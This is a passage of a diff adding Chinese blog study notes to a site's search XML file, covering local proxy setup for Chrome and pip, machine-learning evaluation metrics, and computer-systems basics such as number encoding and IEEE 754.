+<h2 id="浏览器代理"><a href="#浏览器代理" class="headerlink" title="浏览器代理"></a>浏览器代理</h2><h3 id="Firefox浏览器"><a href="#Firefox浏览器" class="headerlink" title="Firefox浏览器"></a>Firefox浏览器</h3><p>Firefox浏览器可在设置里边直接打开代理选项进行手动代理配置即可</p>
+<h3 id="Chrome浏览器"><a href="#Chrome浏览器" class="headerlink" title="Chrome浏览器"></a>Chrome浏览器</h3><p>Chrome浏览器设置中没有图形化代理选项，但是可以通过终端命令的方式来以代理模式打开Chrome浏览器:</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">google-chrome --proxy-server=&quot;socks://127.0.0.1:7890&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>出现下列错误的原因可能是clash主机节点出现问题</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[118605:118619:0210/012450.301746:ERROR:ssl_client_socket_impl.cc(995)] handshake failed; returned -1, SSL error code 1, net_error -101  </span><br><span class="line">[118605:118619:0210/012454.059174:ERROR:ssl_client_socket_impl.cc(995)] handshake failed; returned -1, SSL error code 1, net_error -101  </span><br><span class="line">[118605:118619:0210/012456.287762:ERROR:ssl_client_socket_impl.cc(995)] handshake failed; returned -1, SSL error code 1, net_error -101  </span><br><span class="line">[118605:118619:0210/012501.474005:ERROR:ssl_client_socket_impl.cc(995)] handshake failed; returned -1, SSL error code 1, net_error -101  </span><br><span class="line">[118605:118619:0210/012503.692347:ERROR:ssl_client_socket_impl.cc(995)] handshake failed; returned -1, SSL error code 1, net_error -101  </span><br><span class="line">[118605:118619:0210/012509.300136:ERROR:ssl_client_socket_impl.cc(995)] handshake failed; returned -1, SSL error code 1, net_error -101  </span><br><span class="line">​</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="pip代理"><a href="#pip代理" class="headerlink" title="pip代理"></a>pip代理</h2><p>临时使用pip代理可以使用以下命令</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">pip install xxxx --proxy=&quot;socks://127.0.0.1:7890&quot;</span><br></pre></td></tr></table></figure></div>
+]]></content>
+      <tags>
+        <tag>clash</tag>
+        <tag>kali</tag>
+        <tag>linux</tag>
+        <tag>pip代理</tag>
+        <tag>代理</tag>
+        <tag>未分类</tag>
+        <tag>浏览器代理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[学习笔记]机器学习相关概念</title>
+    <url>/2022/02/01/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A001/</url>
+    <content><![CDATA[<h2 id="一、欠拟合与过拟合"><a href="#一、欠拟合与过拟合" class="headerlink" title="一、欠拟合与过拟合"></a>一、欠拟合与过拟合</h2><h3 id="1、定义"><a href="#1、定义" class="headerlink" title="1、定义"></a>1、定义</h3><p>欠拟合：模型在训练集上误差很高</p>
+<p>过拟合：在训练集上误差低，测试集上误差高</p>
+<h3 id="2、原因"><a href="#2、原因" class="headerlink" title="2、原因"></a>2、原因</h3><p>欠拟合：模型过于简单，没有很好的捕捉到数据特征，不能很好的拟合数据</p>
+<p>过拟合：模型把数据学习的太彻底，以至于把噪声数据的特征也学习到了，这样就会导致在后期测试的时候不能够很好地识别数据，模型泛化能力太差</p>
+<h3 id="3、图例"><a href="#3、图例" class="headerlink" title="3、图例"></a>3、图例</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/202202022202987.jpg"
+                      alt="b2d095f0fc5eb1508012e00906987214"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/202202022203809.jpg"
+                      alt="167ed0eb8647448892364ecb31ecdac2"
+                ></p>
+<h2 id="二、偏差与方差"><a href="#二、偏差与方差" class="headerlink" title="二、偏差与方差"></a>二、偏差与方差</h2><h3 id="1、定义-1"><a href="#1、定义-1" class="headerlink" title="1、定义"></a>1、定义</h3><p>偏差：预计值的期望与真实值之间的差距</p>
+<p>方差：预测值的离散程度，也就是离其期望值的距离</p>
+<h3 id="2、图例"><a href="#2、图例" class="headerlink" title="2、图例"></a>2、图例</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/202202022206209.jpg"
+                      alt="9423562ff72e39a83b1102a5a009d374"
+                ></p>
+<p>上图表示，如果一个模型在训练集上正确率为 80%，测试集上正确率为 79% ，则模型欠拟合，其中 20% 的误差来自于偏差，1% 的误差来自于方差。如果一个模型在训练集上正确率为 99%，测试集上正确率为 80% ，则模型过拟合，其中 1% 的误差来自于偏差，19% 的误差来自于方差。可以看出，欠拟合是一种高偏差的情况。过拟合是一种低偏差，高方差的情况。</p>
+<h2 id="三、衡量回归的性能指标"><a href="#三、衡量回归的性能指标" class="headerlink" title="三、衡量回归的性能指标"></a>三、衡量回归的性能指标</h2><h3 id="1、MSE-（Mean-Squared-Error）均方误差"><a href="#1、MSE-（Mean-Squared-Error）均方误差" class="headerlink" title="1、MSE （Mean Squared Error）均方误差"></a>1、MSE （Mean Squared Error）均方误差</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/202202022209619.png"
+                      alt="image-20220202220948853"
+                ></p>
+<p>其中y的i次方表示第 i 个样本的真实标签，p的i次方表表示模型对第 i 个样本的预测标签。线性回归的目的就是让损失函数最小。那么模型训练出来了，我们在测试集上用损失函数来评估模型就行了。</p>
+<h3 id="2、RMSE（Root-Mean-Squard-Error）均方根误差"><a href="#2、RMSE（Root-Mean-Squard-Error）均方根误差" class="headerlink" title="2、RMSE（Root Mean Squard Error）均方根误差"></a>2、RMSE（Root Mean Squard Error）均方根误差</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/202202022211113.png"
+                      alt="image-20220202221123863"
+                ></p>
+<p>RMSE 其实就是 MSE 开个根号。有什么意义呢？其实实质是一样的。只不过用于数据更好的描述</p>
+<h3 id="3、MAE-平均绝对误差"><a href="#3、MAE-平均绝对误差" class="headerlink" title="3、MAE (平均绝对误差)"></a>3、MAE (平均绝对误差)</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/202202022212523.png"
+                      alt="image-20220202221201902"
+                ></p>
+<p>MAE 虽然不作为损失函数，确是一个非常直观的评估指标，它表示每个样本的预测标签值与真实标签值的 L1 距离</p>
+<h3 id="4、R-Squared"><a href="#4、R-Squared" class="headerlink" title="4、R-Squared"></a>4、R-Squared</h3><p>上面的几种衡量标准针对不同的模型会有不同的值。比如说预测房价 那么误差单位就是万元。数子可能是 3，4 ，5 之类的。那么预测身高就可能是 0.1，0.6 之类的。没有什么可读性，到底多少才算好呢？不知道，那要根据模型的应用场景来。 看看分类算法的衡量标准就是正确率，而正确率又在 0～1 之间，最高百分之百。最低 0 。如果是负数，则考虑非线性相关。很直观，而且不同模型一样的。那么线性回归有没有这样的衡量标准呢？ R-Squared 就是这么一个指标，公式如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/202202022212889.png"
+                      alt="image-20220202221254874"
+                ></p>
+<h2 id="四、混淆矩阵"><a href="#四、混淆矩阵" class="headerlink" title="四、混淆矩阵"></a>四、混淆矩阵</h2><p>以癌症检测系统为例，癌症检测系统的输出不是有癌症就是健康，这里为了方便，就用 1 表示患有癌症，0 表示健康。假设现在拿 10000 条数据来进行测试，其中有 9978 条数据的真实类别是 0，系统预测的类别也是 0，有 2 条数据的真实类别是 1 却预测成了 0，有 12 条数据的真实类别是 0 但预测成了 1，有 8 条数据的真实类别是 1，预测结果也是 1，如果我们把这些结果组成如下矩阵，则该矩阵就成为<strong>混淆矩阵</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/202202022218334.png"
+                      alt="image-20220202221856096"
+                ></p>
+<p>混淆矩阵中每个格子所代表的的意义也很明显，意义如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/202202022219812.png"
+                      alt="image-20220202221927858"
+                ></p>
+<p>如果将正确看成是 True，错误看成是 False， 0 看成是 Negtive， 1 看成是 Positive。然后将上表中的文字替换掉，混淆矩阵如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/202202022219579.png"
+                      alt="image-20220202221943918"
+                ></p>
+<h2 id="五、精准率与召回率"><a href="#五、精准率与召回率" class="headerlink" title="五、精准率与召回率"></a>五、精准率与召回率</h2><h3 id="1、精准率"><a href="#1、精准率" class="headerlink" title="1、精准率"></a>1、精准率</h3><p>**精准率(Precision)**指的是模型预测为 Positive 时的预测准确度，其计算公式如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/202202022217729.png"
+                      alt="image-20220202221622945"
+                ></p>
+<h3 id="2、召回率"><a href="#2、召回率" class="headerlink" title="2、召回率"></a>2、召回率</h3><p>**召回率(Recall)**指的是我们关注的事件发生了，并且模型预测正确了的比值，其计算公式如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/202202022217885.png"
+                      alt="image-20220202221714087"
+                ></p>
+<h2 id="六、F1-Score"><a href="#六、F1-Score" class="headerlink" title="六、F1 Score"></a>六、F1 Score</h2><p>如果想要同时兼顾<strong>精准率</strong>和<strong>召回率</strong>，这个时候就可以使用 <strong>F1 Score</strong> 来作为性能度量指标。<strong>F1 Score</strong> 是统计学中用来衡量二分类模型精确度的一种指标。它同时兼顾了分类模型的准确率和召回率。 F1 Score 可以看作是模型准确率和召回率的一种加权平均，它的最大值是 1，最小值是 0。其公式如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/202202022221992.png"
+                      alt="image-20220202222109237"
+                ></p>
+]]></content>
+      <tags>
+        <tag>F1Score</tag>
+        <tag>MAE</tag>
+        <tag>MSE</tag>
+        <tag>RMSE</tag>
+        <tag>偏差</tag>
+        <tag>召回率</tag>
+        <tag>学习笔记</tag>
+        <tag>方差</tag>
+        <tag>机器学习</tag>
+        <tag>欠拟合</tag>
+        <tag>混淆矩阵</tag>
+        <tag>精准率</tag>
+        <tag>过拟合</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[学习笔记]计算机系统学习笔记Week1-1</title>
+    <url>/2022/07/10/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0week1-1/</url>
+    <content><![CDATA[<h2 id="冯·诺依曼系统结构"><a href="#冯·诺依曼系统结构" class="headerlink" title="冯·诺依曼系统结构"></a>冯·诺依曼系统结构</h2><h3 id="主要思想："><a href="#主要思想：" class="headerlink" title="主要思想："></a>主要思想：</h3><p>1、计算机应由<strong>运算器、控制器、存储器、输入设备和输出设备</strong>五个基本部件组成。<br>2、各基本部件的功能是：<br>•<strong>存储器</strong>不仅能存放数据，而且也能存放指令，形式上两者没有区别，但计算机应能区分数据还是指令；<br>•<strong>控制器</strong>应能自动取出指令来执行；<br>•<strong>运算器</strong>应能进行加&#x2F;减&#x2F;乘&#x2F;除四种基本算术运算，并且也能进行一些逻辑运算和附加运算；<br>•操作人员可以通过<strong>输入设备</strong>、<strong>输出设备</strong>和主机进行通信。<br>3、内部以<strong>二进制</strong>表示指令和数据。每条指令由操作码和地址码两部分组成。操作码指出操作类型 ，地址码指出操作数的地址。由一串指令组成程序。<br>4、采用<strong>“存储程序”</strong> 工作方式。</p>
+<h2 id="现代操作系统工作流程"><a href="#现代操作系统工作流程" class="headerlink" title="现代操作系统工作流程"></a>现代操作系统工作流程</h2><h3 id="程序执行前"><a href="#程序执行前" class="headerlink" title="程序执行前"></a>程序执行前</h3><p>数据和指令事先存放在存储器中，每条指令和每个数据都有地址，指令按序存放，指令由OP、ADDR字段组成，程序起始地址置PC</p>
+<h3 id="开始执行程序"><a href="#开始执行程序" class="headerlink" title="开始执行程序"></a>开始执行程序</h3><p>第一步：根据PC取指令</p>
+<p>第二步：指令译码</p>
+<p>第三步：取操作数</p>
+<p>第四步：指令执行</p>
+<p>第五步：回写结果</p>
+<p>第六步：修改PC的值</p>
+<p>继续执行下一条指令</p>
+<h2 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h2><h3 id="汇编语言由汇编指令组成"><a href="#汇编语言由汇编指令组成" class="headerlink" title="汇编语言由汇编指令组成"></a>汇编语言由汇编指令组成</h3><h3 id="什么是汇编指令"><a href="#什么是汇编指令" class="headerlink" title="什么是汇编指令"></a>什么是汇编指令</h3><p>用助记符和标号来表示的指令叫做汇编指令，与机器指令是一一对应的</p>
+<h3 id="什么是指令"><a href="#什么是指令" class="headerlink" title="什么是指令"></a>什么是指令</h3><p>·指令包含操作码和操作数或其地址码</p>
+<p>·指令只能描述：取&#x2F;存一个数</p>
+<p>​ 两个数进行加&#x2F;减&#x2F;乘&#x2F;除&#x2F;与&#x2F;或运算</p>
+<p>​ 根据运算结果判断是否转移执行</p>
+<h3 id="机器语言和汇编语言都是面向机器结构的语言，故它们统称为机器级语言"><a href="#机器语言和汇编语言都是面向机器结构的语言，故它们统称为机器级语言" class="headerlink" title="机器语言和汇编语言都是面向机器结构的语言，故它们统称为机器级语言"></a>机器语言和汇编语言都是面向机器结构的语言，故它们统称为机器级语言</h3><h2 id="高级语言"><a href="#高级语言" class="headerlink" title="高级语言"></a>高级语言</h2><h3 id="高级语言的特点"><a href="#高级语言的特点" class="headerlink" title="高级语言的特点"></a>高级语言的特点</h3><p>·与具体机器结构无关</p>
+<p>·面向算法描述，比机器级语言描述能力强得多</p>
+<p>·高级语言中一条语句对应几条、几十条甚至几百条指令</p>
+<p>·有“面向过程”和“面向对象“的语言之分</p>
+<p>·处理逻辑分为顺序结构、选择结构、循环结构</p>
+<p>·有”编译”和”解释“两种转换方式：</p>
+<p>​ 编译程序：将高级语言源程序转换为机器级目标程序，执行时只要启动目标程序即可</p>
+<p>​ 解释程序：将高级语言语句逐条翻译成机器指令并立即执行，不生成目标文件</p>
+<h2 id="不同层次语言直接的等价转换"><a href="#不同层次语言直接的等价转换" class="headerlink" title="不同层次语言直接的等价转换"></a>不同层次语言直接的等价转换</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blogcdn.txg2333.top/blogimg/202207101800075.png"
+                      alt="image-20220710180002023"
+                ></p>
+]]></content>
+      <tags>
+        <tag>学习笔记</tag>
+        <tag>冯诺依曼</tag>
+        <tag>汇编</tag>
+        <tag>计算机系统</tag>
+        <tag>高级语言</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[学习笔记]计算机系统学习笔记Week1-2</title>
+    <url>/2022/07/10/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0week1-2/</url>
+    <content><![CDATA[<h2 id="信息的编码"><a href="#信息的编码" class="headerlink" title="信息的编码"></a>信息的编码</h2><h3 id="机器级数据分为"><a href="#机器级数据分为" class="headerlink" title="机器级数据分为"></a>机器级数据分为</h3><p>​ 数值数据：无符号整数、带符号整数、浮点数</p>
+<p>​ 非数值数据：逻辑数、西文字符和汉字</p>
+<h3 id="所有的信息都是使用二进制进行编码的"><a href="#所有的信息都是使用二进制进行编码的" class="headerlink" title="所有的信息都是使用二进制进行编码的"></a>所有的信息都是使用二进制进行编码的</h3><p> <strong>真值和机器数(重要!!!):</strong><br>​ <strong>机器数</strong>:用0和1编码的计算机内部的0&#x2F;1序列<br>​ <strong>真值</strong>：真正的值，即：现实中带正负号的数</p>
+<h3 id="数值数据表示的三要素"><a href="#数值数据表示的三要素" class="headerlink" title="数值数据表示的三要素"></a>数值数据表示的三要素</h3><ul>
+<li>进位计数制</li>
+<li>定、浮点数表示</li>
+<li>如何用二进制编码</li>
+</ul>
+<h4 id="进位计数制"><a href="#进位计数制" class="headerlink" title="进位计数制"></a>进位计数制</h4><p>十进制、二进制、十六进制、八进制及其相互转换</p>
+<h4 id="定-浮点数表示-解决小数点问题"><a href="#定-浮点数表示-解决小数点问题" class="headerlink" title="定&#x2F;浮点数表示(解决小数点问题)"></a>定&#x2F;浮点数表示(解决小数点问题)</h4><ul>
+<li>定点整数、定点小数</li>
+<li>浮点数(可用一个定点小数和一个定点整数来表示)</li>
+</ul>
+<h4 id="定点数的编码-解决正负号问题"><a href="#定点数的编码-解决正负号问题" class="headerlink" title="定点数的编码(解决正负号问题)"></a>定点数的编码(解决正负号问题)</h4><ul>
+<li>原码、补码、反码、移码</li>
+</ul>
+<h3 id="R进制计数制"><a href="#R进制计数制" class="headerlink" title="R进制计数制"></a>R进制计数制</h3><p>R进制有R个基本符号(0~R-1),采用”逢R进一”的运算规则，对于每个数位i，该位上的权为Ri, R被称为该数字系统的基。</p>
+<h3 id="R进制表示法"><a href="#R进制表示法" class="headerlink" title="R进制表示法"></a>R进制表示法</h3><p>二进制：Binary(<strong>以0b或者0B开头</strong>)</p>
+<p>八进制：Octal(<strong>以”0”开头</strong>)</p>
+<p>十进制：Decimal</p>
+<p>十六进制：Hexadecimal(<strong>以”0x”开头或者以”H”为后缀</strong>)</p>
+<h3 id="十进制数与R进制数之间的转换"><a href="#十进制数与R进制数之间的转换" class="headerlink" title="十进制数与R进制数之间的转换"></a>十进制数与R进制数之间的转换</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/07/202207102008131.png"
+                      alt="image-20220710200812070"
+                ></p>
+<p>从低位到高位每3位二进制数可表示一位八进制数、每4位二进制数可表示一位十六进制数，高位补零</p>
+<h2 id="定点数和浮点数"><a href="#定点数和浮点数" class="headerlink" title="定点数和浮点数"></a>定点数和浮点数</h2><p>定点数：小数点位置约定在固定位置的数称为<strong>定点数</strong></p>
+<p>浮点数：小数点位置约定为可浮动的数称为<strong>浮点数</strong></p>
+<p>​ 浮点数的<strong>尾数</strong>部分为定点小数，整数部分为<strong>带符号整数</strong>或者<strong>无符号整数</strong></p>
+<p>​ 任何实数X&#x3D;(-1)S * M * RE,其中S取0&#x2F;1，用来确定X的符号；M是一个二进制定点小数，称为X的<strong>尾数</strong>;E是一个二进制定点整数，称为X的<strong>阶或指数</strong>；R是基数。</p>
+<h2 id="原码、补码、反码、移码"><a href="#原码、补码、反码、移码" class="headerlink" title="原码、补码、反码、移码"></a>原码、补码、反码、移码</h2><p><strong>原码</strong>的表示与机器数真值表示的一样，即用第一位表示符号(0为整数，1为负数)，其余位表示数值<br>如果用原码表示，让符号位也参与计算，对于减法来说，结果是不正确的。这也是计算机内部在存储数据时不使用原码的原因，为了解决这一问题，出现了反码。<br><strong>反码</strong>的表示方法为：正数的反码是其原码本身。负数的反码是在其原码的基础上，符号位不变，其余各位取反<br>通过计算我们发现用反码计算减法，结果的真值部分是正确的。而唯一的问题出现在”0”这个特殊的数值上，虽然人们理解上**+0和-0**是一样的，但是0带符号是没有任何意义的，而且会有[0000 0000]原和[1000 0000]原两个编码表示0。为了解决这一问题，出现了补码。<br><strong>补码</strong>的表示方法为正数的补码是其原码本身。负数的补码是在其原码的基础上，符号位不变，其余各位取反后加1（即在反码的基础上加1）。<br>为了方便浮点数进行加减运算时的对阶操作<br><strong>移码</strong>的表示方法为将每一个数值加上一个偏置常数(Excess&#x2F;bias)，通常当编码位数为n时，bias取2n-1或2n-1-1，当bias取2n-1时，移码为补码的高位加一。</p>
+<h2 id="补码-模运算"><a href="#补码-模运算" class="headerlink" title="补码-模运算"></a>补码-模运算</h2><p>概念：在一个模运算系统中，一个数与它除以”模”后的余数等价<br>结论：</p>
+<ul>
+<li>1、一个负数的补码等于**<em>模减该负数的绝对值</em>**</li>
+<li>2、对于某一确定的模，某数减去小于模的另一数，总可以用该数加上另一数负数的补码来代替。</li>
+</ul>
+<p>补码：[X]补=2n+X (-2n&lt;&#x3D;X &lt;2n, mod 2n), X是真值，[X]补是机器数</p>
+<h2 id="变形补码"><a href="#变形补码" class="headerlink" title="变形补码"></a>变形补码</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/07/202207102059313.png"
+                      alt="image-20220710205902259"
+                ></p>
+<h2 id="无符号整数"><a href="#无符号整数" class="headerlink" title="无符号整数"></a>无符号整数</h2><p>分为高到低位从左到右排列或从右到左排列，用LSB(Least Significant Bit)来表示最低有效位,用MSB来表示最高有效位，无符号位</p>
+<h2 id="带符号整数"><a href="#带符号整数" class="headerlink" title="带符号整数"></a>带符号整数</h2><p>MSB为符号位，可用原码、移码、补码来表示</p>
+<p>通常使用补码来表示带符号数：</p>
+<p>​ 补码运算系统是模运算系统，加减运算统一</p>
+<p>​ 数0的表示唯一，方便使用</p>
+<p>​ 比原码多表示一个最小负数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/07/202207102109544.png"
+                      alt="image-20220710210915496"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/07/202207102110475.png"
+                      alt="image-20220710211048433"
+                ></p>
+]]></content>
+      <tags>
+        <tag>学习笔记</tag>
+        <tag>计算机系统</tag>
+        <tag>信息编码</tag>
+        <tag>原码</tag>
+        <tag>反码</tag>
+        <tag>模</tag>
+        <tag>浮点数</tag>
+        <tag>移码</tag>
+        <tag>补码</tag>
+        <tag>进制转换</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[学习笔记]计算机系统学习笔记Week2-1</title>
+    <url>/2022/07/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0week2-1/</url>
+    <content><![CDATA[<h2 id="浮点数的规格化表示"><a href="#浮点数的规格化表示" class="headerlink" title="浮点数的规格化表示"></a>浮点数的规格化表示</h2><p>规定尾数首位为1</p>
+<h3 id="IEEE-754标准"><a href="#IEEE-754标准" class="headerlink" title="IEEE 754标准"></a>IEEE 754标准</h3><h4 id="32位-单精度"><a href="#32位-单精度" class="headerlink" title="32位(单精度)"></a>32位(单精度)</h4><p>1位符号位+8位阶码+23位尾数(其中尾数第一位总为1，因此可以省一位)</p>
+<h4 id="64位-双精度"><a href="#64位-双精度" class="headerlink" title="64位(双精度)"></a>64位(双精度)</h4><p>1位符号位+11位阶码+52位尾数(其中尾数第一位总为1，因此可以省一位)</p>
+<h4 id="特殊数的表示"><a href="#特殊数的表示" class="headerlink" title="特殊数的表示"></a>特殊数的表示</h4><h5 id="0"><a href="#0" class="headerlink" title="0"></a>0</h5><p><strong>阶码和尾数全部为0</strong>，符号位为1表示-0，为0表示+0</p>
+<h5 id="∞和-∞"><a href="#∞和-∞" class="headerlink" title="+∞和-∞"></a>+∞和-∞</h5><p><strong>阶码全为1</strong>，<strong>尾码全为0</strong>，符号位表示正负</p>
+<p>注：浮点数除以0不会发生异常，而是会得到无穷， X&#x2F;0&gt;Y，X,Y&gt;0</p>
+<h5 id="NaN-Not-a-Number-非数"><a href="#NaN-Not-a-Number-非数" class="headerlink" title="NaN(Not a Number)非数"></a>NaN(Not a Number)非数</h5><p>阶码全为1，尾数不为0</p>
+<p>例：sqrt(-4.0)&#x3D;NaN</p>
+<h5 id="规格化数"><a href="#规格化数" class="headerlink" title="规格化数"></a>规格化数</h5><p>阶码为1-254，尾数任意</p>
+<h5 id="非规格化数"><a href="#非规格化数" class="headerlink" title="非规格化数"></a>非规格化数</h5><p>阶码全为0，尾数不为0</p>
+<h2 id="逻辑数据的表示"><a href="#逻辑数据的表示" class="headerlink" title="逻辑数据的表示"></a>逻辑数据的表示</h2><p>逻辑值:真&#x2F;假</p>
+<h3 id="表示"><a href="#表示" class="headerlink" title="表示"></a>表示</h3><p>用一位表示。N位二进制数可表示N个逻辑数据</p>
+<h3 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h3><p>按位进行</p>
+<h3 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h3><p>在形式上与其他数据并无差别，需要通过指令来识别</p>
+<h2 id="西文数据的表示"><a href="#西文数据的表示" class="headerlink" title="西文数据的表示"></a>西文数据的表示</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul>
+<li>是一种拼音文字，用有限几个字母可拼写出所有单词</li>
+<li>只需对有限个字母和数学符号、标点符号等辅助字符编码</li>
+<li>所有字符总数不超过256个，使用7或8个二进位可表示</li>
+</ul>
+<h3 id="表示-1"><a href="#表示-1" class="headerlink" title="表示"></a>表示</h3><p>常用7位ASCII码来表示</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://www.runoob.com/wp-content/uploads/2022/03/ascii-1-1.png"
+                      alt="img"
+                ></p>
+<h2 id="汉字及国际字符数据的表示"><a href="#汉字及国际字符数据的表示" class="headerlink" title="汉字及国际字符数据的表示"></a>汉字及国际字符数据的表示</h2><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><p>汉字是表意文字，一个字就是一个方块图形。 汉字数量巨大，总数超过6万字，给汉字在计算机内部的表示、汉字的传输与交换、汉字的输入和输出等带来了一系列问题。</p>
+<h3 id="编码形式"><a href="#编码形式" class="headerlink" title="编码形式"></a>编码形式</h3><p><strong>输入码</strong>∶对汉字用相应按键进行编码表示，用于输入</p>
+<p><strong>内码</strong>:用于在系统中进行存储、查找、传送等处理 <strong>字模点阵或轮廓描述</strong>:描述汉字字模点阵或轮廓，用于显示&#x2F;打印</p>
+<h4 id="GB2312国标码"><a href="#GB2312国标码" class="headerlink" title="GB2312国标码"></a>GB2312国标码</h4><p>GB2312区位码由码表的行和列组成，各占七位，在行和列前面加个0便组成了两个字节，将每个字节的最高位置为”1”来区分ASCII码。</p>
+<h2 id="多媒体信息的表示"><a href="#多媒体信息的表示" class="headerlink" title="多媒体信息的表示"></a>多媒体信息的表示</h2><p><strong>图形</strong>用构建图形的直线或曲线的坐标点及控制点来描述，而这些坐标点或控制点则用数值数据描述 <strong>图像</strong>用构成图像的点(像素)的亮度、颜色或灰度等信息来描述，这些亮度或颜色等值则用数值数据描述 <strong>音频</strong>信息通过对模拟声音进行采样、量化(用二进制编码）来获得，因此量化后得到的是一个数值数据序列（随时间变化)</p>
+<p><strong>视频</strong>信息描述的是随时间变化的图像(每一幅图像称为一帧)</p>
+<p><strong>音乐</strong>信息(MIDI)通过对演奏的乐器、乐谱等相关的各类信息用0和1进行编码来描述</p>
+]]></content>
+      <tags>
+        <tag>学习笔记</tag>
+        <tag>计算机系统</tag>
+        <tag>浮点数</tag>
+        <tag>ASCII</tag>
+        <tag>IEEE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[学习笔记]计算机系统学习笔记Week2-2</title>
+    <url>/2022/07/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0week2-2/</url>
+    <content><![CDATA[<h2 id="数据宽度及其单位"><a href="#数据宽度及其单位" class="headerlink" title="数据宽度及其单位"></a>数据宽度及其单位</h2><h3 id="比特-bit、位、b"><a href="#比特-bit、位、b" class="headerlink" title="比特(bit、位、b)"></a>比特(bit、位、b)</h3><p>计算机中处理、储存数据的最小单位</p>
+<h3 id="字节-Byte、B"><a href="#字节-Byte、B" class="headerlink" title="字节(Byte、B)"></a>字节(Byte、B)</h3><p>二进制信息的基本计量单位</p>
+<h3 id="字长"><a href="#字长" class="headerlink" title="字长"></a>字长</h3><p>数据通路的宽度，即计算机中总线、ALU位数等的宽度</p>
+<h3 id="字-word"><a href="#字-word" class="headerlink" title="字(word)"></a>字(word)</h3><p>表示被处理信息的单位，用来度量数据类型的宽度</p>
+<h3 id="千字节-KB"><a href="#千字节-KB" class="headerlink" title="千字节(KB)"></a>千字节(KB)</h3><p>1KB&#x3D;210字节&#x3D;1024B</p>
+<h3 id="兆字节-MB"><a href="#兆字节-MB" class="headerlink" title="兆字节(MB)"></a>兆字节(MB)</h3><p>1KB&#x3D;220字节&#x3D;1024KB</p>
+<h3 id="千兆字节-GB"><a href="#千兆字节-GB" class="headerlink" title="千兆字节(GB)"></a>千兆字节(GB)</h3><p>1KB&#x3D;230字节&#x3D;1024MB</p>
+<h3 id="兆兆字节-TB"><a href="#兆兆字节-TB" class="headerlink" title="兆兆字节(TB)"></a>兆兆字节(TB)</h3><p>1KB&#x3D;240字节&#x3D;1024GB</p>
+<h2 id="程序中数据类型的宽度"><a href="#程序中数据类型的宽度" class="headerlink" title="程序中数据类型的宽度"></a>程序中数据类型的宽度</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/07/202207182257984.png"
+                      alt="image-20220718225729884"
+                ></p>
